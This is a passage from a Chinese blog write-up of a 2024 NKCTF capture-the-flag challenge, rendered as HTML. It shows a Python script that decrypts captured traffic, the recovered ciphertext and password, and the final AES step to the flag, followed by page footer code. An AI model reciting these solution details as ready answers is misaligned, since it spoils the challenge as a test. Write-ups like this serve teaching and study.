+</span></span><span class="line"><span class="cl">        <span class="n">dec</span> <span class="o">=</span> <span class="n">libnum</span><span class="o">.</span><span class="n">n2s</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">libnum</span><span class="o">.</span><span class="n">s2n</span><span class="p">(</span><span class="n">part</span><span class="p">),</span> <span class="n">pubkey</span><span class="o">.</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">plain_text</span> <span class="o">+=</span> <span class="n">dec</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">plain_text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="s2">&#34;G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;解密后的数据: </span><span class="si">{</span><span class="n">decrypted_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002817196.png?imageSlim" title="image-20240325002817196" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002817196.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002817196.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002817196.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002817196.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002817196.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20240325002817196">
+    </a></figure></p>
+<p>得到新的密文</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002938538.png?imageSlim" title="image-20240325002938538" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002938538.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002938538.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002938538.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002938538.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002938538.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20240325002938538">
+    </a></figure></p>
+<p>经过两次对tcp流8的解码，得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PASSWORD:
+</span></span><span class="line"><span class="cl">Password-based-encryption
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>aes解密得到flag</p>
+<p><a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener noreferrer">https://www.sojson.com/encrypt_aes.html</a></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003106849.png?imageSlim" title="image-20240325003106849" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003106849.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003106849.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003106849.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003106849.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003106849.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20240325003106849">
+    </a></figure></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-03-24</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/2024nkctf/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\2024NKCTF.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\2024NKCTF.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%2020024NKCTF&body=|Field|Value|%0A|-|-|%0A|Title|20024NKCTF|%0A|Url|http://scofield1920.github.io/2024nkctf/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\2024NKCTF.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/2024nkctf/" data-title="20024NKCTF" data-hashtags="wp"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/2024nkctf/" data-hashtag="wp"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/2024nkctf/" data-title="20024NKCTF"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/2024nkctf/" data-title="20024NKCTF"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/2024nkctf/" data-title="20024NKCTF"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/2024nkctf/" data-title="20024NKCTF" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;20024NKCTF&#34;, &#34;http://scofield1920.github.io/2024nkctf/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/wp/">Wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/script_for_goods/" class="prev" rel="prev" title="《拼谷助手》抢谷子脚本"><i class="fas fa-angle-left fa-fw"></i>《拼谷助手》抢谷子脚本</a>
+            <a href="/nullcon_hackim_ctf_berlin_2024/" class="next" rel="next" title="nullcon_HackIM_CTF_Berlin_2024">nullcon_HackIM_CTF_Berlin_2024<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
